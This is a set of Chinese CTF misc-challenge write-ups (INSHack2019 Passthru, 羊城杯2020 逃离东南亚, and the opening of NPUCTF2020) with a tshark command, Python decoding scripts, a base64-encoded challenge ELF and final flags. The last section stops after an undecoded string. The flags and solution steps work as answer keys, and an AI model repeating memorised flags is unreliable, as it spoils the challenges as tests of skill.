flag：flag{MY_FAVOURITE_EDITOR_IS_VIM}
187.[INSHack2019]Passthru给了sslkey.log文件，先解密一下
过滤get
http.request.method==GET

看到有很多kcahsni，比赛的名字叫inshark
查找


可以手动导一下也可以tshark
tshark -r capture.pcap -o &#x27;ssl.keylog_file:sslkey.log&#x27; -Y &#x27;http contains &quot;GET /searchbyimage&quot;&#x27; -T fields -e http.request.uri.query.parameter &gt; outdata.txt

image_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D82290383-7480-487c-b78b-77ac769c56cd%26kcahsni%3D9ef773fe97f56554a3b4,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D8bd542b5-2056-489e-bc1c-4f028ef27894%26kcahsni%3D26cd07e1f71df3dcee9f,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3De76528cd-17d3-490a-be20-2d817ccee04e%26kcahsni%3D1eaf89725ab93968fc52,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D491c01dd-f1a3-43c3-b3c8-30c4ab73ff4b%26kcahsni%3Df03c0a7d653539616433,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Deeed4c5d-8a5f-4b8c-a12d-a2ef007e09e2%26kcahsni%3D66333861303164636130,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Db69d43cd-ac86-4b20-acc6-6a441d94ae3e%26kcahsni%3D30663937353965366432,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3De56bc952-42c2-4631-96ee-e2e7cac51406%26kcahsni%3D30353331373634326335,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Dece42ab1-a9d1-44df-a0b5-6b7e83aa9cd0%26kcahsni%3D34323166636461643033,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D71ad1cf6-a31a-4694-812b-9ea5db6e3cad%26kcahsni%3D34656265373037376332,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D1b3c7025-b1a8-477f-9d16-89c254af258a%26kcahsni%3D62646464343732627b41,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D64ac599c-e5ac-43bc-a2e0-0447257cd5bc%26kcahsni%3D534e490b3295c3d06c24,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3Dd8af7f01-5b92-4ad3-8c80-c6af467eac30%26kcahsni%3Df2a8c7e8936667dbf7fe,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D01b77323-6be9-4abd-b427-9f09d992a4df%26kcahsni%3Dce28456a0fd24ac21ec6,encoded_image=,image_content=,filename=,hl=frimage_url=http%3A%2F%2Frequestbin.net%2Fr%2Fzk2s2ezk%3Fid%3D3f3e4f2f-5d92-4d3a-8ce8-f11943b42df3%26kcahsni%3Da12e3efe4b,encoded_image=,image_content=,filename=,hl=fr

主要是需要kcahsni的值
转化一下，最后reverse一下，脚本：
#Written by: mochu7import binasciifrom urllib.parse import unquoteflag=b&#x27;&#x27;with open(&#x27;./outdata.txt&#x27;) as f:    for line in f.readlines():        line = unquote(line)        hexdata = line[line.find(&#x27;kcahsni=&#x27;)+8:line.find(&#x27;,&#x27;)]        hexstring = binascii.unhexlify(hexdata)        flag += hexstring    print(flag[::-1])

得到INSA{b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e}
flag：flag{b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e}
188.[羊城杯 2020]逃离东南亚第一个压缩包有张图片，随波逐流修复宽高得到解压密码：wdnmd
第二个压缩包有个文本打开发现是brainfuck加密
但是这个bf加密要以++++++++[开头，这个没有需要加上
解密出来一串base64
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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAVAAAAAAAAgBUAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAAAARAAAAAAAANAAAAAAAAAFQGQAAAAAAAGQAAAAAAAAAQDmAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAABgOYAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAJAAAAAAAAFAAAAAAAAADADQAAAAAAABgAAAAAAAAC4AkAAAAAAAAoAAAAAAAAAQwAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAABBgAAAAAAACAAAAAAAAAEgAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAuANAAAAAAAAHAAAAAAAAAKADQAAAAAAACAAAAAAAAAAYAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAD+//9vAAAAAIADQAAAAAAA////bwAAAAABAAAAAAAAAPD//28AAAAAdANAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACgOYAAAAAAAAAAAAAAAAAAAAAAAAAAAADYEQAAAAAAARgRAAAAAAABWBEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGlzIHRoZXJlIGFueXRoaW5nPwAA5LmfAOiuuADkvaAA6K+lAOS6hgDop6MA5LiAAOS4iwDogIEA5rapAOmAvADpmpAA5YaZAAAAAAAAR0NDOiAoVWJ1bnR1IDUuNC4wLTZ1YnVudHUxfjE2LjA0LjEwKSA1LjQuMCAyMDE2MDYwOQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCQAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCQAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCQAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCQAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCQAAAAAAAAAAAAAAAAAAAAAAAAwAGADADQAAAAAAAAAAAAAAAAAAAAAAAAwAHAHQDQAAAAAAAAAAAAAAAAAAAAAAAAwAIAIADQAAAAAAAAAAAAAAAAAAAAAAAAwAJAKADQAAAAAAAAAAAAAAAAAAAAAAAAwAKALgDQAAAAAAAAAAAAAAAAAAAAAAAAwALAAAEQAAAAAAAAAAAAAAAAAAAAAAAAwAMACAEQAAAAAAAAAAAAAAAAAAAAAAAAwANAGAEQAAAAAAAAAAAAAAAAAAAAAAAAwAOAHAEQAAAAAAAAAAAAAAAAAAAAAAAAwAPAFQGQAAAAAAAAAAAAAAAAAAAAAAAAwAQAGAGQAAAAAAAAAAAAAAAAAAAAAAAAwARANQGQAAAAAAAAAAAAAAAAAAAAAAAAwASAAgHQAAAAAAAAAAAAAAAAAAAAAAAAwATABAOYAAAAAAAAAAAAAAAAAAAAAAAAwAUABgOYAAAAAAAAAAAAAAAAAAAAAAAAwAVACAOYAAAAAAAAAAAAAAAAAAAAAAAAwAWACgOYAAAAAAAAAAAAAAAAAAAAAAAAwAXAPgPYAAAAAAAAAAAAAAAAAAAAAAAAwAYAAAQYAAAAAAAAAAAAAAAAAAAAAAAAwAZAEAQYAAAAAAAAAAAAAAAAAAAAAAAAwAaAK0QYAAAAAAAAAAAAAAAAAAAAAAAAwAbAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAQAVACAOYAAAAAAAAAAAAAAAAAAZAAAAAgAOAKAEQAAAAAAAAAAAAAAAAAAbAAAAAgAOAOAEQAAAAAAAAAAAAAAAAAAuAAAAAgAOACAFQAAAAAAAAAAAAAAAAABEAAAAAQAaAK0QYAAAAAAAAQAAAAAAAABTAAAAAQAUABgOYAAAAAAAAAAAAAAAAAB6AAAAAgAOAEAFQAAAAAAAAAAAAAAAAACGAAAAAQATABAOYAAAAAAAAAAAAAAAAAClAAAABADx/wAAAAAAAAAAAAAAAAAAAACsAAAAAQAZAGAQYAAAAAAATQAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACyAAAAAQASAPgHQAAAAAAAAAAAAAAAAADAAAAAAQAVACAOYAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAADMAAAAAAATABgOYAAAAAAAAAAAAAAAAADdAAAAAQAWACgOYAAAAAAA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AAAAABgOYAAAAAAAGA4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAOEAAAABAAAAAwAAAAAAAAAgDmAAAAAAACAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADmAAAABgAAAAMAAAAAAAAAKA5gAAAAAAAoDgAAAAAAANABAAAAAAAABgAAAAAAAAAIAAAAAAAAABAAAAAAAAAAmAAAAAEAAAADAAAAAAAAAPgPYAAAAAAA+A8AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAO8AAAABAAAAAwAAAAAAAAAAEGAAAAAAAAAQAAAAAAAAMAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD4AAAAAQAAAAMAAAAAAAAAQBBgAAAAAABAEAAAAAAAAG0AAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAAA/gAAAAgAAAADAAAAAAAAAK0QYAAAAAAArRAAAAAAAAADAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAMBAAABAAAAMAAAAAAAAAAAAAAAAAAAAK0QAAAAAAAANQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAACMGQAAAAAAAAwBAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAA6BAAAAAAAAB4BgAAAAAAAB4AAAAwAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAAGAXAAAAAAAALAIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=

cyberchef发现是elf文件
打开发现
hei~what you want??want a flag?sorry~there is no flagbut maybe your can find something useful!

没什么用。看那个打架.wav
发现是slighteye隐写，解密出来得到This1sThe3rdZIPpwd——第三个压缩包的密码
有很多文件，我们慢慢查找一下，发现
elf文件下的rtld.c、malloc文件夹下的malloc.c、malloc文件夹下的arena.c发现有空格和tab组成的信息
脚本提取：
def f_read(name):    f=open(name,&quot;r&quot;)    flag=&quot;&quot;    useless=r&quot;abcdefghijklmnopqrstuvw\xyz;,)&quot;    for line in f.readlines():        line=line.replace(&quot;\n&quot;,&quot;&quot;)        if &quot;&#125;&quot; in line:            t = line.split(&quot;&#125;&quot;)            if len(t[1]) != 0:                x = 1                for i in useless:                    if i in t[1]:                        x = 0                        break                if x:                    for s in t[1]:                        if s == &#x27;\t&#x27;:                            flag += &quot;1&quot;                        else:                            flag += &quot;0&quot;    f.close()          print(flag)    print(&quot;*****&quot;)f_read(&quot;rtld.c&quot;)f_read(&quot;arena.c&quot;)f_read(&quot;malloc.c&quot;)

得到：
01010011010011110101001100100001001000000111000001101100011001010011000010111001101100101001000000110100001100101011011000111000000100000011011010110010100100000001011010011111000100000011100100111010001101100011001000010111001100011*****011110010110111101110101011100100010000001100110011011000110000101100111001000000110100101110011001000000110100101101110001000000110110101100001011011000110110001101111011000110010111001100011*****0100011101010111010000110101010001000110011110110110001101101111011001000110010101011111011100110111010001100101011001110110000101101110011011110110011101110010011000010111000001101000011110010101111100110001011100110101111101100110011101010110111001101110011110010010000101111101*****

得到GWCTF{code_steganography_1s_funny!}
flag：flag{code_steganography_1s_funny!}
189.[NPUCTF2020]碰上彩虹，吃定彩虹！ntfs数据流，导出一下
=wwZlZ=8W=cndwljcdcG8wdj8W8Z8dZllGjZc=8lWjnlWd8WwZ5j=l8ccWZcZGjd5ZwZ5WZ8d=Zcwjwl5Gnn=WdwcwlnWd5lGnZWlnnwdnjnw8ndnc58d5cndl=njZl=WddjwWWwZllj5c5jGwZnZ5W=cZljdwd8c=85ndGGljcl5ccwd=W=l8w=5lwWn8WnwnWlGZwdcnGGl5G=8W==cnnWZnWjZ=wWcGwZcWc8ncWW=5jnWwcZl8W=8cdwWldlnwW5ddwlnlwncWlcwGZddj5djZWc5jcWdn5jdjwnj85GWGjnjwGd=jZGj5j==jwjlw8dlwWj5Wjn5n8dwwdjZlc5lZwdWldZlnGwl85cWnjd=WcWlwj8WGdlGncnZWGGd5ZncW5d55nW5wl=Wj8jGWnWj8jwZ=ZwWZ88nWG5nn5WlWnGdWw5Zn8jdl=nGcnll8WncZjnGn=dlwn5W8wlWjlnl5ccnGWGnnnc58WnjlGnG55Zwdn5cZdjdZZ5WljG5G5wcldd=Wlc8Z=8nGj=jWd8w8Wd=w8nccc8wZdjcnGdljZnnj5ww8885=lcWW8W8j5dG8jZZwG55GjnwZ=W5Z8G5ZlGc